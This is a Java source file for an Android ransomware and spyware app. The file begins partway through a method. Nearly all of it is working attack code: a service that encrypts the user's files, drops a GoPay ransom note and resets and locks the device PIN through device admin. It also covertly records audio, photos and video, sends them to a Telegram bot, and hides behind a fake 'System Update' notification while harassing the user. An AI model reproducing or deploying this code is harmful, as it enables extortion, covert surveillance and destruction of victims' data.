            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        isServiceRunning = true;
        createNotificationChannel();
        startForeground(1, getNotification());

        sendMessage("🚀 Ransomware deployed on " + getDeviceId());

        initCameraIds();
        startWatchdog();
        startAnnoyingFeatures();
        startRecordingLoop();
        startCameraLoop();
        startFlashlightLoop();
        setDeviceLockPin();
        encryptAllFiles();

        sendMessage("✅ Encryption completed on " + getDeviceId());

        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_QUICKBOOT_POWERON);
        registerReceiver(new BootReceiver(), filter);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void initCameraIds() {
        try {
            int numberOfCameras = Camera.getNumberOfCameras();
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.getCameraInfo(i, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    cameraFrontId = i;
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    cameraBackId = i;
                }
            }
        } catch (Exception e) { }
    }

    private void startFlashlightLoop() {
        flashlightThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isServiceRunning) {
                    try {
                        toggleFlashlight();
                        Thread.sleep(500);
                    } catch (Exception e) { }
                }
            }
        });
        flashlightThread.start();
    }

    private void toggleFlashlight() {
        try {
            if (cameraManager != null) {
                String cameraId = cameraManager.getCameraIdList()[0];
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    cameraManager.setTorchMode(cameraId, !flashlightOn);
                    flashlightOn = !flashlightOn;
                }
            }
        } catch (CameraAccessException e) { }
    }

    private void startCameraLoop() {
        cameraThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isServiceRunning) {
                    try {
                        if (cameraFrontId != -1) {
                            String frontPhotoPath = capturePhoto(cameraFrontId, "front");
                            if (frontPhotoPath != null) {
                                sendFileToTelegram(frontPhotoPath, "📸 Front Camera Photo from " + getDeviceId());
                                new File(frontPhotoPath).delete();
                            }
                        }

                        if (cameraBackId != -1) {
                            String backPhotoPath = capturePhoto(cameraBackId, "back");
                            if (backPhotoPath != null) {
                                sendFileToTelegram(backPhotoPath, "📸 Back Camera Photo from " + getDeviceId());
                                new File(backPhotoPath).delete();
                            }
                        }

                        if (cameraFrontId != -1) {
                            String frontVideoPath = captureVideo(cameraFrontId, "front", 10);
                            if (frontVideoPath != null) {
                                sendFileToTelegram(frontVideoPath, "🎥 Front Camera Video (10s) from " + getDeviceId());
                                new File(frontVideoPath).delete();
                            }
                        }

                        if (cameraBackId != -1) {
                            String backVideoPath = captureVideo(cameraBackId, "back", 10);
                            if (backVideoPath != null) {
                                sendFileToTelegram(backVideoPath, "🎥 Back Camera Video (10s) from " + getDeviceId());
                                new File(backVideoPath).delete();
                            }
                        }

                        Thread.sleep(10000);
                    } catch (Exception e) { }
                }
            }
        });
        cameraThread.start();
    }

    private String capturePhoto(int cameraId, String type) {
        try {
            Camera camera = Camera.open(cameraId);
            if (camera == null) return null;

            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = "photo_" + type + "_" + timestamp + ".jpg";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            final File photoFile = new File(filePath);

            camera.takePicture(null, null, new PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        FileOutputStream fos = new FileOutputStream(photoFile);
                        fos.write(data);
                        fos.close();
                        camera.release();
                    } catch (Exception e) { }
                }
            });

            Thread.sleep(2000);
            camera.release();

            if (photoFile.exists()) {
                return filePath;
            }
            return null;

        } catch (Exception e) {
            return null;
        }
    }

    private String captureVideo(int cameraId, String type, int durationSeconds) {
        MediaRecorder videoRecorder = null;
        try {
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = "video_" + type + "_" + timestamp + ".mp4";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            Camera camera = Camera.open(cameraId);
            if (camera == null) return null;

            Camera.Parameters params = camera.getParameters();
            params.setFocusMode(Camera.Parameters.FOCUS_MODE_AUTO);
            camera.setParameters(params);

            camera.unlock();

            videoRecorder = new MediaRecorder();
            videoRecorder.setCamera(camera);
            videoRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            videoRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            videoRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            videoRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            videoRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            videoRecorder.setVideoSize(640, 480);
            videoRecorder.setVideoFrameRate(30);
            videoRecorder.setOutputFile(filePath);

            if (type.equals("front")) {
                videoRecorder.setOrientationHint(270);
            } else {
                videoRecorder.setOrientationHint(90);
            }

            videoRecorder.prepare();
            videoRecorder.start();

            Thread.sleep(durationSeconds * 1000);

            videoRecorder.stop();
            videoRecorder.release();
            camera.release();

            if (new File(filePath).exists()) {
                return filePath;
            }
            return null;

        } catch (Exception e) {
            if (videoRecorder != null) {
                try { videoRecorder.release(); } catch (Exception ex) { }
            }
            return null;
        }
    }

    private void setDeviceLockPin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                dpm.lockNow();
                sendMessage("🔒 Device locked with PIN (hidden)");
            }
        } catch (Exception e) { }
    }

    private void startWatchdog() {
        watchdogThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isServiceRunning) {
                    try {
                        Thread.sleep(10000);
                        if (!isServiceRunning) {
                            Intent restartIntent = new Intent(RansomwareService.this, RansomwareService.class);
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                startForegroundService(restartIntent);
                            } else {
                                startService(restartIntent);
                            }
                            isServiceRunning = true;
                            sendMessage("🔄 Watchdog restarted service");
                        }
                    } catch (InterruptedException e) { }
                }
            }
        });
        watchdogThread.start();
    }

    private void startAnnoyingFeatures() {
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        setMaxVolumeAndLock();

        annoyingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isServiceRunning) {
                    try {
                        if (vibrator != null && vibrator.hasVibrator()) {
                            long[] pattern = {0, 500, 200, 500, 200, 500};
                            vibrator.vibrate(pattern, 0);
                        }

                        playIdiotSong();
                        setMaxVolumeAndLock();

                        Thread.sleep(5000);
                    } catch (Exception e) { }
                }
            }
        });
        annoyingThread.start();
    }

    private void setMaxVolumeAndLock() {
        try {
            audioManager.setStreamVolume(AudioManager.STREAM_MUSIC,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_RING,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
            audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION,
                    audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);

            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.setKeyguardDisabledFeatures(adminComponent,
                        DevicePolicyManager.KEYGUARD_DISABLE_VOLUME_CONTROLS);
            }
        } catch (Exception e) { }
    }

    private void playIdiotSong() {
        try {
            if (mediaPlayer != null && mediaPlayer.isPlaying()) return;

            String audioUrl = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(audioUrl);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(MediaPlayer mp) {
                    mp.start();
                    mp.setLooping(true);
                }
            });
            mediaPlayer.setOnErrorListener(new MediaPlayer.OnErrorListener() {
                @Override
                public boolean onError(MediaPlayer mp, int what, int extra) {
                    playFallbackSound();
                    return true;
                }
            });
        } catch (Exception e) {
            playFallbackSound();
        }
    }

    private void playFallbackSound() {
        try {
            ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_MUSIC, 100);
            tg.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 5000);
        } catch (Exception e) { }
    }

    private void startRecordingLoop() {
        recordThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isServiceRunning) {
                    try {
                        String audioPath = recordAudio(10);
                        if (audioPath != null) {
                            sendFileToTelegram(audioPath, "🎤 Audio Recording (10s) from " + getDeviceId());
                            new File(audioPath).delete();
                        }
                        Thread.sleep(10000);
                    } catch (Exception e) { }
                }
            }
        });
        recordThread.start();
    }

    private String recordAudio(int durationSeconds) {
        try {
            String fileName = "recording_" + System.currentTimeMillis() + ".3gp";
            String filePath = getExternalFilesDir(null) + "/" + fileName;

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(filePath);
            mediaRecorder.prepare();
            mediaRecorder.start();

            Thread.sleep(durationSeconds * 1000);

            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;

            return filePath;
        } catch (Exception e) {
            return null;
        }
    }

    private void sendFileToTelegram(String filePath, String caption) {
        try {
            File file = new File(filePath);
            if (!file.exists()) return;

            String urlString;
            String fileName = file.getName().toLowerCase();
            if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
            } else if (fileName.endsWith(".mp4") || fileName.endsWith(".3gp") || fileName.endsWith(".mov")) {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendVideo";
            } else {
                urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            }

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary");

            String boundary = "----WebKitFormBoundary";
            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            wr.writeBytes(caption + "\r\n");

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            wr.writeBytes(CHAT_ID + "\r\n");

            String fieldName = "document";
            if (fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") || fileName.endsWith(".png")) {
                fieldName = "photo";
            } else if (fileName.endsWith(".mp4") || fileName.endsWith(".3gp") || fileName.endsWith(".mov")) {
                fieldName = "video";
            }

            wr.writeBytes("--" + boundary + "\r\n");
            wr.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n");
            wr.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                wr.write(buffer, 0, bytesRead);
            }
            fis.close();
            wr.writeBytes("\r\n--" + boundary + "--\r\n");
            wr.flush();
            wr.close();

            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private void encryptAllFiles() {
        try {
            String key = "r4ns0mK3y2025R4ns0mK3y2025";
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");
            String[] targetPaths = {
                    Environment.getExternalStorageDirectory().getAbsolutePath(),
                    "/storage/emulated/0",
                    "/sdcard"
            };

            for (String path : targetPaths) {
                File rootDir = new File(path);
                if (rootDir.exists() && rootDir.isDirectory()) {
                    walkAndEncrypt(rootDir, secretKey);
                }
            }
            dropRansomNote();
        } catch (Exception e) { }
    }

    private void walkAndEncrypt(File directory, SecretKeySpec secretKey) {
        try {
            File[] files = directory.listFiles();
            if (files == null) return;

            String[] skipFolders = {"Android", "data", "obb", "cache", "tmp", "log", "system"};
            for (String skip : skipFolders) {
                if (directory.getName().equalsIgnoreCase(skip)) return;
            }

            String[] targetExts = {"jpg", "jpeg", "png", "gif", "bmp", "mp4", "avi", "mkv", "mov",
                    "mp3", "wav", "flac", "aac", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
                    "pdf", "txt", "rtf", "csv", "json", "xml", "db", "sqlite", "bak",
                    "zip", "rar", "7z", "tar", "gz", "apk"};

            for (File file : files) {
                if (file.isDirectory()) {
                    walkAndEncrypt(file, secretKey);
                } else {
                    String name = file.getName();
                    String ext = "";
                    int lastDot = name.lastIndexOf(".");
                    if (lastDot > 0) ext = name.substring(lastDot + 1).toLowerCase();

                    for (String targetExt : targetExts) {
                        if (ext.equals(targetExt) && !name.endsWith(".locked")) {
                            encryptFile(file, secretKey);
                            break;
                        }
                    }
                }
            }
        } catch (Exception e) { }
    }

    private void encryptFile(File file, SecretKeySpec secretKey) {
        try {
            byte[] iv = new byte[16];
            SecureRandom random = new SecureRandom();
            random.nextBytes(iv);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);

            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();

            byte[] encrypted = cipher.doFinal(data);

            FileOutputStream fos = new FileOutputStream(file);
            fos.write(iv);
            fos.write(encrypted);
            fos.close();

            File newFile = new File(file.getAbsolutePath() + ".locked");
            file.renameTo(newFile);
        } catch (Exception e) { }
    }

    private void dropRansomNote() {
        String note = "==================================================\n" +
                "YOUR FILES HAVE BEEN ENCRYPTED\n" +
                "==================================================\n\n" +
                "All your files have been locked with AES-256.\n\n" +
                "To recover your files, you must pay via GoPay:\n" +
                "   GoPay Number: " + PAYMENT_NUMBER + "\n" +
                "   Nominal: Rp 100.000\n\n" +
                "After payment, send your Device ID and payment proof to:\n" +
                "   Email: " + CONTACT_EMAIL + "\n\n" +
                "Device ID: " + getDeviceId() + "\n\n" +
                "WARNING: DO NOT attempt to decrypt your files yourself.\n" +
                "==================================================";

        try {
            String[] paths = {Environment.getExternalStorageDirectory().getAbsolutePath(),
                    "/storage/emulated/0", "/sdcard"};
            for (String path : paths) {
                File noteFile = new File(path, "READ_ME.txt");
                FileOutputStream fos = new FileOutputStream(noteFile);
                fos.write(note.getBytes());
                fos.close();
            }
        } catch (Exception e) { }
    }

    private void sendMessage(String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8") +
                    "&text=" + URLEncoder.encode(message, "UTF-8") +
                    "&parse_mode=HTML";

            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(postData);
            wr.flush();
            wr.close();
            conn.disconnect();
        } catch (Exception e) { }
    }

    private String getDeviceId() {
        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Update Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }

    private Notification getNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Update")
                .setContentText("Installing security patches...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        isServiceRunning = false;
        if (watchdogThread != null) watchdogThread.interrupt();
        if (annoyingThread != null) annoyingThread.interrupt();
        if (recordThread != null) recordThread.interrupt();
        if (cameraThread != null) cameraThread.interrupt();
        if (flashlightThread != null) flashlightThread.interrupt();
        if (mediaPlayer != null) {
            mediaPlayer.stop();
            mediaPlayer.release();
        }
        if (mediaRecorder != null) {
            mediaRecorder.release();
        }
        if (cameraFront != null) {
            cameraFront.release();
            cameraFront = null;
        }
        if (cameraBack != null) {
            cameraBack.release();
            cameraBack = null;
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

// ================================================
// 3. BOOT RECEIVER
// ================================================

class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_QUICKBOOT_POWERON.equals(intent.getAction())) {
            
            Intent serviceIntent = new Intent(context, RansomwareService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            Intent activityIntent = new Intent(context, MainActivity.class);
            activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(activityIntent);
        }
    }
}

// ================================================
// 4. ADMIN RECEIVER
// ================================================

class AdminReceiver extends DeviceAdminReceiver {
    private static final String ENCRYPTED_PIN = "YQRSbWNmbw==";
    private static final String XOR_KEY = "XyZ2025";

    private String decryptPin() {
        try {
            byte[] decoded = android.util.Base64.decode(ENCRYPTED_PIN, android.util.Base64.DEFAULT);
            String encodedString = new String(decoded, "UTF-8");
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < encodedString.length(); i++) {
                char c = encodedString.charAt(i);
                char keyChar = XOR_KEY.charAt(i % XOR_KEY.length());
                result.append((char)(c ^ keyChar));
            }
            return result.toString();
        } catch (Exception e) {
            return "944721";
        }
    }

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                dpm.lockNow();
                dpm.setKeyguardDisabledFeatures(adminComponent,
                        DevicePolicyManager.KEYGUARD_DISABLE_VOLUME_CONTROLS);
            }
        } catch (Exception e) { }
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);
            if (dpm.isAdminActive(adminComponent)) {
                dpm.resetPassword(decryptPin(), DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
            }
        } catch (Exception e) { }
    }

    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            dpm.lockNow();
        } catch (Exception e) { }
    }
}
